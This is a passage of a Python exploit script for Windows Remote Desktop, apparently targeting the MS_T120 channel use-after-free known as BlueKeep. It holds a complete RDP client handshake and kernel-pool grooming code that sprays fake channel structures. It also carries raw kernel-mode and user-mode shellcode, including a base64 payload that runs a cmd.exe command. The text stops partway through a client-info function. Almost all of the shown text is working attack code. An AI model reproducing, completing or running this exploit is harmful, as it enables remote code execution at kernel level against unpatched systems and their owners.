#!/usr/bin/env python3

import argparse
import base64
import binascii
import errno
import socket
import ssl
import struct
import sys
import time
import traceback

g_config = {}

g_sc = base64.b64decode(
    b"/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu+AdKgpBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY21kLmV4ZSAvYyBBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQA="
)


class GroomStrategy(object):
    def __init__(self, client, args):
        self.client = client
        self.args = args

    @staticmethod
    def factory(client, args):
        name = args["GROOM"].lower()

        if name == "frag":
            return FragGroomStrategy(client, args)
        elif name == "chunk":
            return ChunkGroomStrategy(client, args)

        return None

    def before_connect(self):
        pass

    def after_handshake(self):
        pass

    def trigger_free(self, send=True):
        print_warning("<---------------- | Entering Danger Zone | ---------------->")
        print_status("\tTriggering free!")
        # malformed Disconnect Provider Indication PDU (opcode: 0x2, total_size != 0x20)
        pkt = b""
        pkt += b"\x00\x00\x00\x00\x00\x00\x00\x00\x02"  # offset +0x8 = opcode
        pkt += b"\x00" * 0x22

        mst120 = self.client.find_channel_by_name("MS_T120")
        tpkt = self.client.make_channel_raw(mst120.channel_id, pkt, len(pkt), 3)
        if send:
            self.transport_write(tpkt)

        return tpkt

    def trigger_use(self):
        print_status("\tTriggering use!")
        print_warning("<---------------- | Leaving Danger Zone | ---------------->")
        # Disconnect Provider Ultimatum will force use of channel
        self.client.terminate_connection()
        self.client.disconnect()

    def generate_payloads(self, header_offset=0x38):
        for payload in self.payloads:
            yield payload[header_offset:]

    def make_channel(self, header_offset=0x38):
        return self.channel[header_offset:]


class FragGroomStrategy(GroomStrategy):
    def before_connect(self):
        # bind raw sock
        pass

    def after_handshake(self):
        pass

    def send_frag_packet(self, alloc_size):
        pass


class ChunkGroomStrategy(GroomStrategy):
    def __init__(self, client, args):
        super(ChunkGroomStrategy, self).__init__(client, args)
        self.pool_addr = int(args["GROOMBASE"]) + (
            0x400 * 1024 * int(args["GROOMSIZE"])
        )

    def after_handshake(self):
        fake_channel = self.create_fake_channel()
        payloads = self.create_payloads()

        vprint_status(
            "Using CHUNK groom strategy. %dMB -> 0x%x"
            % (int(self.args["GROOMSIZE"]), self.pool_addr)
        )

        try:
            start_id = 0x3ED
            start = time.time()

            max_channel = start_id + int(self.args["GROOMCHANNELCOUNT"])

            channel_filler_tpkt = self.client.make_channel_raw(
                start_id, fake_channel, 0x0FFFFFFF, 0
            )

            # send initial grooms
            self.client.transport_write(channel_filler_tpkt * 1024)

            # send wrapped free trigger
            trigger_tpkt = channel_filler_tpkt * 20
            trigger_tpkt += self.trigger_free(False)
            trigger_tpkt += channel_filler_tpkt * 80

            self.client.transport_write(trigger_tpkt)

            tpkts = b""
            for i in range(0x40, 2048):
                for id in range(start_id, max_channel):
                    tpkts += channel_filler_tpkt

                if len(tpkts) > 0x420:
                    self.client.transport_write(tpkts)
                    tpkts = b""
                print_status_counter("\t\tSurfing channels...\t", i, 0x800, 0x40)

            groomMB = int(
                self.args["GROOMSIZE"] * (1024 / len(payloads))
            )  # 0x400 is 1kib

            for i in range(0, groomMB):
                tpkts = b""
                for id in range(start_id, max_channel):
                    for payload in payloads:
                        tpkts += self.client.make_channel_raw(
                            id, payload, 0x0FFFFFFF, 0
                        )
                self.client.transport_write(tpkts)
                if ((time.time() - start) + 1) % 10 == 0:
                    self.client.transport_write(
                        b"\x04\x80\x0a\x20\x00\x08\xff\x03\x26\x01"
                    )
                print_status_counter("\t\tLobbing eggs...\t\t", i, groomMB)

            self.trigger_use()
        except socket.error as e:
            if e.errno == errno.ECONNRESET:
                print_bad(
                    "Connection reset: Groom failed! (Avoided crash... hopefully)"
                )
                sys.exit(1)
            else:
                raise e

    def create_fake_channel(self):
        overspray_addr = self.pool_addr + 0x2000
        shellcode_vtbl = self.pool_addr + 0x48

        chan = b""
        # first 0x38 bytes are used by DATA PDU packet
        # fake channel starts at +0x38, which is +0x20 of an _ERESOURCE
        chan += struct.pack("<Q", 0x00)  # 0x38 00000020 SharedWaiters QWORD
        chan += struct.pack("<Q", 0x00)  # 0x40 00000028 ExclusiveWaiters QWORD
        chan += struct.pack(
            "<Q", overspray_addr + 0x48
        )  # 0x48 00000030 OwnerEntry      _OWNER_ENTRY
        chan += struct.pack(
            "<Q", overspray_addr + 0x48
        )  # 0x50 00000038 OwnerEntry      _OWNER_ENTRY
        chan += struct.pack("<I", 0x00)  # 0x58 00000040 ActiveEntries   DWORD
        chan += struct.pack("<I", 0x00)  # 0x5c 00000044 ContentionCount DWORD
        chan += struct.pack("<I", 0x00)  # 0x60 00000048 NumberOfSharedWaiters DWORD
        chan += struct.pack("<I", 0x00)  # 0x64 0000004C NumberOfExclusiveWaiters DWORD
        chan += struct.pack("<Q", 0x00)  # 0x68 00000050 Reserved2       QWORD
        chan += struct.pack(
            "<Q", overspray_addr + 0x48
        )  # 0x70 00000058 Address         QWORD / CreatorBackTraceIndex QWORD
        chan += struct.pack("<Q", 0x00)  # 0x78 00000060 SpinLock        QWORD

        # 00000080 resource2 _ERESOURCE
        chan += struct.pack(
            "<Q", overspray_addr + 0x48
        )  # 0x80 + 00000000 SystemResourcesList _LIST_ENTRY
        chan += struct.pack(
            "<Q", overspray_addr + 0x48
        )  # 0x80 + 00000008 SystemResourcesList _LIST_ENTRY
        chan += struct.pack("<Q", 0x00)  # 0x80 + 00000010 OwnerTable      QWORD
        chan += struct.pack("<H", 0x00)  # 0x80 + 00000018 ActiveCount     WORD
        chan += struct.pack("<H", 0x00)  # 0x80 + 0000001A Flag            WORD
        chan += struct.pack("<I", 0x00)  # 0x80 + 0000001C Pad DWORD
        chan += struct.pack("<Q", 0x00)  # 0x80 + 00000020 SharedWaiters
        chan += struct.pack("<Q", 0x00)  # 0x80 + 00000028 ExclusiveWaiters QWORD
        chan += struct.pack(
            "<Q", overspray_addr + 0x48
        )  # 0x80 + 00000030 OwnerEntry      _OWNER_ENTRY
        chan += struct.pack(
            "<Q", overspray_addr + 0x48
        )  # 0x80 + 00000038 OwnerEntry      _OWNER_ENTRY
        chan += struct.pack("<I", 0x00)  # 0x80 + 00000040 ActiveEntries   DWORD
        chan += struct.pack("<I", 0x00)  # 0x80 + 00000044 ContentionCount DWORD
        chan += struct.pack("<I", 0x00)  # 0x80 + 00000048 NumberOfSharedWaiters DWORD
        chan += struct.pack(
            "<I", 0x00
        )  # 0x80 + 0000004C NumberOfExclusiveWaiters DWORD
        chan += struct.pack("<Q", 0x00)  # 0x80 + 00000050 Reserved2       QWORD
        chan += struct.pack(
            "<Q", overspray_addr + 0x48
        )  # 0x80 + 00000058 Address         QWORD / CreatorBackTraceIndex QWORD
        chan += struct.pack("<Q", 0x00)  # 0x80 + 00000060 SpinLock        QWORD

        chan += struct.pack("<I", 0x1F)  # 0xb0 000000E8 classOffset     DWORD
        chan += struct.pack("<I", 0x00)  # 0xb4 000000EC bindStatus      DWORD
        chan += struct.pack("<Q", 0x72)  # 0xb8 000000F0 lockCount1      QWORD
        chan += struct.pack(
            "<Q", overspray_addr + 0x448
        )  # 0xc0 000000F8 connection      QWORD
        chan += struct.pack("<Q", shellcode_vtbl)  # 0xc8 00000100 shellcode vtbl  QWORD
        chan += struct.pack("<I", 0x05)  # 0xd0 00000108 channelClass    DWORD
        chan += b"MS_T120\x00"  # 0xd4 0000010C channelName     CHAR[8]
        chan += struct.pack("<I", 0x1F)  # 0xdc 00000114 channelIndex    DWORD
        chan += struct.pack(
            "<Q", overspray_addr + 0x810
        )  # 0xe0 00000118 channels        QWORD
        chan += struct.pack(
            "<Q", overspray_addr + 0x810
        )  # 0xe8 00000120 connChannelsAddr QWORD
        chan += struct.pack(
            "<Q", overspray_addr + 0x810
        )  # 0xf0 00000128 list1           _LIST_ENTRY
        chan += struct.pack(
            "<Q", overspray_addr + 0x810
        )  # 0xf8 00000130 list1           _LIST_ENTRY
        chan += struct.pack(
            "<Q", overspray_addr + 0x810
        )  # 0x100 00000138 list2          _LIST_ENTRY
        chan += struct.pack(
            "<Q", overspray_addr + 0x810
        )  # 0x108 00000140 list2          _LIST_ENTRY
        chan += struct.pack("<I", 0x65756C62)  # 0x110 00000148 inputBufferLen  DWORD
        chan += struct.pack("<I", 0x7065656B)  # 0x114 0000014C sysParams       DWORD
        chan += struct.pack(
            "<Q", overspray_addr + 0x810
        )  # 0x118 00000150 connResource    QWORD
        chan += struct.pack("<I", 0x65756C62)  # 0x120 00000158 lockCount158    DWORD
        chan += struct.pack("<I", 0x7065656B)  # 0x124 0000015C dword15C        DWORD
        return chan

    def create_payloads(self, header_size=0x48):
        payloads = []
        kmode_egg = 0xB00DAC0FEFE42069
        umode_egg = 0xB00DAC0FEFE31337

        # len(kmode) == 873 (0x0369)
        kmode = b""
        kmode += b"\x90"
        kmode += b"\x90"
        kmode += b"\x90"
        kmode += b"\x90"
        kmode += b"\x55\xe8\x61\x00\x00\x00\xb9\x82\x00\x00\xc0\x0f\x32\x4c\x8d\x0d\x5b\x00\x00\x00\x44\x39\xc8\x74\x19\x39\x45\x00"
        kmode += b"\x74\x0a\x89\x55\x04\x89\x45\x00\xc6\x45\xf8\x00\x49\x91\x50\x5a\x48\xc1\xea\x20\x0f\x30\x5d\x65\x48\x8b\x04\x25\x88\x01\x00\x00"
        kmode += b"\x66\x83\x80\xc4\x01\x00\x00\x01\x4c\x8d\x9c\x24\xb8\x00\x00\x00\x31\xc0\x49\x8b\x5b\x30\x49\x8b\x6b\x40\x49\x8b\x73\x48\x4c\x89"
        kmode += b"\xdc\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x5f\xc3\x48\xc7\xc5\x00\x41\xd0\xff\xc3\x0f\x01\xf8\x65\x48\x89\x24\x25\x10\x00\x00\x00\x65"
        kmode += b"\x48\x8b\x24\x25\xa8\x01\x00\x00\x6a\x2b\x65\xff\x34\x25\x10\x00\x00\x00\x50\x50\x55\xe8\xd1\xff\xff\xff\x48\x8b\x45\x00\x48\x83"
        kmode += b"\xc0\x1f\x48\x89\x44\x24\x10\x51\x52\x41\x50\x41\x51\x41\x52\x41\x53\x31\xc0\xb2\x01\xf0\x0f\xb0\x55\xf8\x75\x14\xb9\x82\x00\x00"
        kmode += b"\xc0\x8b\x45\x00\x8b\x55\x04\x0f\x30\xfb\xe8\x0e\x00\x00\x00\xfa\x41\x5b\x41\x5a\x41\x59\x41\x58\x5a\x59\x5d\x58\xc3\x41\x57\x41"
        kmode += b"\x56\x57\x56\x53\x50\x4c\x8b\x7d\x00\x49\xc1\xef\x0c\x49\xc1\xe7\x0c\x49\x81\xef\x00\x10\x00\x00\x66\x41\x81\x3f\x4d\x5a\x75\xf1"
        kmode += b"\x4c\x89\x7d\x08\x65\x4c\x8b\x34\x25\x88\x01\x00\x00\xbf\x78\x7c\xf4\xdb\xe8\x13\x01\x00\x00\x48\x91\xbf\x3f\x5f\x64\x77\xe8\x0e"
        kmode += b"\x01\x00\x00\x8b\x40\x03\x89\xc3\x3d\x00\x04\x00\x00\x72\x03\x83\xc0\x10\x48\x8d\x50\x28\x4c\x8d\x04\x11\x4d\x89\xc1\x4d\x8b\x09"
        kmode += b"\x4d\x39\xc8\x0f\x84\xd8\x00\x00\x00\x4c\x89\xc8\x4c\x29\xf0\x48\x3d\x00\x07\x00\x00\x77\xe6\x4d\x29\xce\xbf\xe1\x14\x01\x17\xe8"
        kmode += b"\xcd\x00\x00\x00\x8b\x78\x03\x83\xc7\x08\x31\xc0\x48\x8d\x34\x19\x50\xe8\x03\x01\x00\x00\x3d\xd8\x83\xe0\x3e\x58\x74\x1e\x48\xff"
        kmode += b"\xc0\x48\x3d\x00\x03\x00\x00\x75\x0a\x31\xc9\x88\x4d\xf8\xe9\x8e\x00\x00\x00\x48\x8b\x0c\x39\x48\x29\xf9\xeb\xd0\xbf\x48\xb8\x18"
        kmode += b"\xb8\xe8\x84\x00\x00\x00\x48\x89\x45\xf0\x48\x8d\x34\x11\x48\x89\xf3\x48\x8b\x5b\x08\x48\x39\xde\x74\xf7\x4a\x8d\x14\x33\xbf\x3e"
        kmode += b"\x4c\xf8\xce\xe8\x69\x00\x00\x00\x8b\x40\x03\x48\x83\x7c\x02\xf8\x00\x74\xde\x48\x8d\x4d\x10\x4d\x31\xc0\x4c\x8d\x0d\xa9\x00\x00"
        kmode += b"\x00\x55\x6a\x01\x55\x41\x50\x48\x83\xec\x20\xbf\xc4\x5c\x19\x6d\xe8\x35\x00\x00\x00\x48\x8d\x4d\x10\x4d\x31\xc9\xbf\x34\x46\xcc"
        kmode += b"\xaf\xe8\x24\x00\x00\x00\x48\x83\xc4\x40\x85\xc0\x74\xa3\x48\x8b\x45\x20\x80\x78\x1a\x01\x74\x09\x48\x89\x00\x48\x89\x40\x08\xeb"
        kmode += b"\x90\x58\x5b\x5e\x5f\x41\x5e\x41\x5f\xc3\xe8\x02\x00\x00\x00\xff\xe0\x53\x51\x56\x41\x8b\x47\x3c\x41\x8b\x84\x07\x88\x00\x00\x00"
        kmode += b"\x4c\x01\xf8\x50\x8b\x48\x18\x8b\x58\x20\x4c\x01\xfb\xff\xc9\x8b\x34\x8b\x4c\x01\xfe\xe8\x1f\x00\x00\x00\x39\xf8\x75\xef\x58\x8b"
        kmode += b"\x58\x24\x4c\x01\xfb\x66\x8b\x0c\x4b\x8b\x58\x1c\x4c\x01\xfb\x8b\x04\x8b\x4c\x01\xf8\x5e\x59\x5b\xc3\x52\x31\xc0\x99\xac\xc1\xca"
        kmode += b"\x0d\x01\xc2\x85\xc0\x75\xf6\x92\x5a\xc3\x55\x53\x57\x56\x41\x57\x49\x8b\x28\x4c\x8b\x7d\x08\x52\x5e\x4c\x89\xcb\x31\xc0\x44\x0f"
        kmode += b"\x22\xc0\x48\x89\x02\x89\xc1\x48\xf7\xd1\x49\x89\xc0\xb0\x40\x50\xc1\xe0\x06\x50\x49\x89\x01\x48\x83\xec\x20\xbf\xea\x99\x6e\x57"
        kmode += b"\xe8\x65\xff\xff\xff\x48\x83\xc4\x30\x85\xc0\x75\x6d\x48\x8b\x3e\x57\x48\x8d\x35\x28\xfd\xff\xff\x48\xbf\x37\x13\xe3\xef\x0f\xac"
        kmode += b"\x0d\xb0\x48\x81\xee\x00\x04\x00\x00\x48\x8b\x46\xf8\x48\x39\xf8\x75\xf0\x48\xff\xc6\x48\x8b\x46\xf8\x48\x39\xf8\x75\xf4\x5f\xb9"
        kmode += b"\x80\x03\x00\x00\xf3\xa4\x48\x8b\x45\xf0\x48\x8b\x40\x18\x48\x8b\x40\x20\x48\x8b\x00\x66\x83\x78\x48\x18\x75\xf6\x48\x8b\x50\x50"
        kmode += b"\x81\x7a\x0c\x33\x00\x32\x00\x75\xe9\x4c\x8b\x78\x20\xbf\x5e\x51\x5e\x83\xe8\xfa\xfe\xff\xff\x48\x89\x03\x31\xc9\x88\x4d\xf8\xb1"
        kmode += b"\x01\x44\x0f\x22\xc1\x41\x5f\x5e\x5f\x5b\x5d\xc3\x48\x92\x31\xc9\x51\x51\x49\x89\xc9\x4c\x8d\x05\x0d\x00\x00\x00\x89\xca\x48\x83"
        kmode += b"\xec\x20\xff\xd0\x48\x83\xc4\x30\xc3"

        umode = b"H\x8d\r\xf9\xff\xff\xffI\xb8i \xe4\xef\x0f\xac\r\xb0H\x81\xe9\x00\x04\x00\x00H\x8bQ\xf8L9\xc2u\xf0\xff\xe1"
        umode += struct.pack(
            "<Q", umode_egg
        )  # umode requires two eggs for variable eggfinder gadget
        umode += self.args["PAYLOAD"]

        payloads.append(self.create_shellcode(kmode, kmode_egg, header_size))
        payloads.append(self.create_shellcode(umode, umode_egg, header_size))

        return payloads

    def create_shellcode(self, payload, egg=0xB00DAC0FEFE42069, header_size=0x48):
        max_size = 0x400 - header_size
        p = b""
        # This vtable should land at address: pool_addr+0x48
        # First entry is a ptr to shellcode : pool_addr+0x50
        # p += struct.pack('<Q', self.pool_addr+0x50)
        p += struct.pack(
            "<Q", self.pool_addr + header_size + 0x10
        )  # indirect call gadget, over this pointer + egg
        p += struct.pack("<Q", egg)
        p += payload
        p += b"\x00" * (max_size - len(p))
        return p


class RdpChannel(object):
    def __init__(self, name, flags=0x80000000):
        self.name = name
        self.flags = flags
        self.channel_id = -1
        self.client = None

    def on_data_received(self, client, data, flags, full_pkt):
        self.client.print_func(
            "[%s] Recv data (%d): %s"
            % (self.name, len(data), binascii.hexlify(data)[0:50])
        )

    def send_message(self, data):
        self.client.print_func(
            "[%s] Send message (%d): %s"
            % (self.name, len(data), binascii.hexlify(data)[0:50])
        )
        self.client.send_channel_message(self.channel_id, data)

    def send_raw(self, data, total_length, flags=0):
        self.client.print_func(
            "[%s] Send raw (%d): %s"
            % (self.name, len(data), binascii.hexlify(data)[0:50])
        )
        self.client.send_channel_raw(self.channel_id, data, total_length, flags)


class ExploitRdpdrChannel(RdpChannel):
    def __init__(self, groom_strategy):
        super(ExploitRdpdrChannel, self).__init__("rdpdr", 0x80800000)
        self.groom_strategy = groom_strategy

    def on_data_received(self, client, data, flags, full_pkt):
        super(ExploitRdpdrChannel, self).on_data_received(client, data, flags, full_pkt)

        ctyp = struct.unpack("<H", data[0:2])[0]
        if ctyp != 0x4472:  # Header->RDPDR_CTYP_CORE = 0x4472
            return

        # opcodes = https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpefs/29d4108f-8163-4a67-8271-e48c4b9c2a7c
        opcode = struct.unpack("<H", data[2:4])[0]

        # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpefs/7500118a-c1f2-45ff-a67e-a09682940402
        if opcode == 0x496E:  # Server Device Announce Response
            self.client.print_func(
                "[rdpdr] Header->PAKID_CORE_SERVER_ANNOUNCE = 0x496e"
            )
            self.send_message(self.rdpdr_client_announce_reply())
            self.send_message(self.rdpdr_client_name_request())
        elif opcode == 0x5350:
            self.client.print_func(
                "[rdpdr] Header->PAKID_CORE_SERVER_CAPABILITY = 0x5350"
            )
            # change opcode 1 byte to match server capabilities (0x4350)
            reply = data[:3] + b"\x43" + data[4:]
            self.send_message(reply)
        elif opcode == 0x4343:  # Server Client ID confirm
            self.client.print_func(
                "[rdpdr] Header->PAKID_CORE_CLIENTID_CONFIRM = 0x4343"
            )
            self.send_message(self.rdpdr_client_device_list_announce_request())
            self.groom_strategy.after_handshake()
        else:
            self.client.print_func("[rdpdr] unknown opcode (%04x)" % (opcode))

    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpefs/d6fe6d1b-c145-4a6f-99aa-4fe3cdcea398
    # DR_CORE_CLIENT_ANNOUNCE_RSP
    def rdpdr_client_announce_reply(self):
        p = b""
        p += b"\x72\x44"  # Header->RDPDR_CTYP_CORE = 0x4472
        p += b"\x43\x43"  # Header->PAKID_CORE_CLIENTID_CONFIRM = 0x4343
        p += b"\x01\x00"  # VersionMajor = 0x0001
        p += b"\x0c\x00"  # VersionMinor = 0x000c
        p += b"\x02\x00\x00\x00"  # ClientId = 0x00000002
        return p

    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpefs/902497f1-3b1c-4aee-95f8-1668f9b7b7d2
    # DR_CORE_CLIENT_NAME_REQ
    def rdpdr_client_name_request(self):
        p = b""
        p += b"\x72\x44"  #  Header->RDPDR_CTYP_CORE = 0x4472
        p += b"\x4e\x43"  #  Header->PAKID_CORE_CLIENT_NAME = 0x434e
        p += b"\x01\x00\x00\x00"  # UnicodeFlag = 0x00000001
        p += b"\x00\x00\x00\x00"  # CodePage = 0x00000000
        p += b"\x0e\x00\x00\x00"  # ComputerNameLen = 0x0000001e (30)
        p += b"\x65\x00\x74\x00\x68\x00\x64\x00\x65\x00\x76\x00\x00\x00"
        return p

    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpefs/10ef9ada-cba2-4384-ab60-7b6290ed4a9a
    # DR_CORE_DEVICELIST_ANNOUNCE_REQ
    def rdpdr_client_device_list_announce_request(self):
        return b"\x72\x44\x41\x44\x00\x00\x00\x00"

    def rdpdr_client_device_list_remove(self):
        p = b""
        p += b"\x72\x44"  # Header->RDPDR_CTYP_CORE = 0x4472
        p += b"\x4d\x44"  # Header->PAKID_CORE_DEVICELIST_REMOVE =  0x444d
        p += b"\xff\xff\xff\x01"  # size in bytes * 4
        p += b"\x01\x00\x00\x00"
        return p


class RdpClient(object):
    def __init__(self, host, port, protocol, print_func, timeout=35.0):
        self.host = host
        self.port = port
        self.protocol = protocol
        self.timeout = timeout
        self.channels = []
        self.print_func = print_func
        self.sock = None

    def add_channel(self, channel):
        if self.find_channel_by_name(channel.name) != None:
            return

        channel.channel_id = 1004 + len(self.channels)
        channel.client = self

        self.print_func("[%s] Assigned to %d" % (channel.name, channel.channel_id))
        self.channels.append(channel)

    def find_channel_by_name(self, name):
        name = name.lower()
        for channel in self.channels:
            if channel.name.lower() == name:
                return channel
        return None

    def find_channel_by_id(self, id):
        start = 1004
        if len(self.channels) == 0 or id < start or id > start + len(self.channels):
            return None

        return self.channels[id - start]

    def connect(self):
        self._create_socket()

        vprint_status("Socket connection established.")

        self.send_client_data()
        self.send_channel_packets()
        self.send_client_info()

        self.recv_packet()  # Server License Error PDU
        self.recv_packet()  # Server Demand Active PDU

        self.send_confirm_active()
        self.send_establish_session()

        print_good("Completed RDP handshake!")

        while self.sock != None:
            pkt = self.recv_packet()
            self._handle_packet(pkt)

    def disconnect(self):
        if self.sock != None:
            self.sock.close()
            self.sock = None

    def transport_write(self, pkt):
        self.tls.sendall(pkt)

    def _handle_packet(self, pkt):
        if pkt[0] == 0x3 or pkt[0] == "\x03":
            self._handle_tpkt(pkt)
        else:
            pass

    def _handle_tpkt(self, pkt):
        if pkt[4:7] != b"\x02\xf0\x80":
            return

        if pkt[7] == 0x68 or pkt[7] == "\x68":
            user = pkt[8:10]
            channel_id = struct.unpack(">H", pkt[10:12])[0]
            channel = self.find_channel_by_id(channel_id)

            if channel == None:
                return

            flags = pkt[18:22]
            data = pkt[22:]
            channel.on_data_received(self, data, flags, pkt)

    def _create_socket(self):
        self.sock = socket.create_connection((self.host, self.port), self.timeout)

        context = ssl._create_unverified_context(
            protocol=self.protocol
        )  # allow certificate errors!

        # Enable legacy/weak ciphers for old Windows versions (XP, 7, 2008)
        context.set_ciphers("ALL:@SECLEVEL=0")
        context.options &= ~ssl.OP_NO_SSLv3  # Enable SSLv3 if needed
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        self.sock.sendall(self.build_negotiate_request())
        self.sock.recv(8192)

        self.tls = context.wrap_socket(self.sock, server_hostname=self.host)

    def recv_packet(self):
        """throws socket.timeout"""
        hdr = self.recv_raw(4)

        if hdr[0] == 0x3 or hdr[0] == "\x03":
            amount = struct.unpack(">H", hdr[2:4])[0] - 4
        else:
            flags = hdr[1]
            if (flags & 0x80) == 0x80:
                amount = (struct.unpack(">H", hdr[1:3])[0] & 0x7FFF) - 4
            else:
                amount = flags - 4

        hdr += self.recv_raw(amount)

        self.print_func(
            "[RdpClient] recv_packet(%d): %s" % (len(hdr), binascii.hexlify(hdr[0:50]))
        )
        return hdr

    def recv_raw(self, amount):
        """throws socket.timeout"""
        data = b""
        while amount > 0:
            new_data = self.tls.recv(amount)
            data += new_data
            amount -= len(new_data)

        return data

    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/e78db616-689f-4b8a-8a99-525f7a433ee2
    def build_negotiate_request(self):
        pkt = b""
        pkt += b"\x03\x00\x00\x13"  # TPKT
        pkt += b"\x0e\xe0\x00\x00\x00\x00\x00"  # X.224 0xe = CR TPDU
        pkt += b"\x01"  # RDP Negotiation Request
        pkt += b"\x00"  # Flags
        pkt += b"\x08\x00"  # Length
        pkt += b"\x01\x00\x00\x00"  # request TLS
        return pkt

    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/2610fcc7-3df4-4166-85bb-2c7ae21f6151
    def send_client_data(self):
        pkt = b""
        pkt += b"\x03\x00\x02\x13\x02\xf0\x80\x7f\x65\x82\x02\x07\x04\x01\x01\x04\x01\x01\x01\x01\xff\x30\x1a\x02\x01\x22\x02\x01\x02\x02\x01\x00\x02\x01\x01\x02\x01\x00\x02\x01\x01\x02\x03\x00\xff\xff\x02\x01\x02\x30\x19\x02\x01\x01\x02\x01\x01\x02\x01\x01\x02\x01\x01\x02\x01\x00\x02\x01\x01\x02\x02\x04\x20\x02\x01\x02\x30\x20\x02\x03\x00\xff\xff\x02\x03\x00\xfc\x17\x02\x03\x00\xff\xff\x02\x01\x01\x02\x01\x00\x02\x01\x01\x02\x03\x00\xff\xff\x02\x01\x02\x04\x82\x01\xa1\x00\x05\x00\x14\x7c\x00\x01\x81\x98\x00\x08\x00\x10\x00\x01\xc0\x00\x44\x75\x63\x61\x81\x8a\x01\xc0\xea\x00\x0b\x00\x08\x00\x00\x04\x00\x03\x01\xca\x03\xaa\x09\x04\x00\x00\x28\x0a\x00\x00\x65\x00\x74\x00\x68\x00\x64\x00\x65\x00\x76\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xca\x01\x00\x00\x00\x00\x00\x10\x00\x07\x00\x61\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\xc0\x0c\x00\x0d\x00\x00\x00\x00\x00\x00\x00\x02\xc0\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\xc0\x80\x00\x0a\x00\x00\x00"

        pkt += b"\x72\x64\x70\x64\x72\x00\x00\x00\x00\x00\x80\xc0"  # rdpdr
        spam_channel = g_config["GROOMCHANNEL"].encode()
        full_spam_pkt = (
            spam_channel + (b"\x00" * (8 - len(spam_channel))) + b"\x00\x00\x00\xc0"
        )
        pkt += full_spam_pkt
        pkt += full_spam_pkt
        pkt += b"\x4d\x53\x5f\x58\x58\x58\x30\x00\x00\x00\xa0\xc0"  # MS_XXX0
        pkt += b"\x4d\x53\x5f\x58\x58\x58\x31\x00\x00\x00\xa0\xc0"  # MS_XXX1
        pkt += b"\x4d\x53\x5f\x58\x58\x58\x32\x00\x00\x00\xa0\xc0"  # MS_XXX2
        pkt += b"\x4d\x53\x5f\x58\x58\x58\x33\x00\x00\x00\xa0\xc0"  # MS_XXX3
        pkt += b"\x4d\x53\x5f\x58\x58\x58\x34\x00\x00\x00\xa0\xc0"  # MS_XXX4
        pkt += b"\x4d\x53\x5f\x58\x58\x58\x35\x00\x00\x00\xa0\xc0"  # MS_XXX5
        pkt += b"\x4d\x53\x5f\x54\x31\x32\x30\x00\x00\x00\xa0\xc0"  # MS_T120

        pkt += b"\x06\xc0\x08\x00\x00\x00\x00\x00"

        self.transport_write(pkt)
        self.recv_packet()

    def send_client_info(self):
        p = b"\x03\x00\x01\x49\x02\xf0\x80\x64"
        p += struct.pack(">H", self.get_user_id())
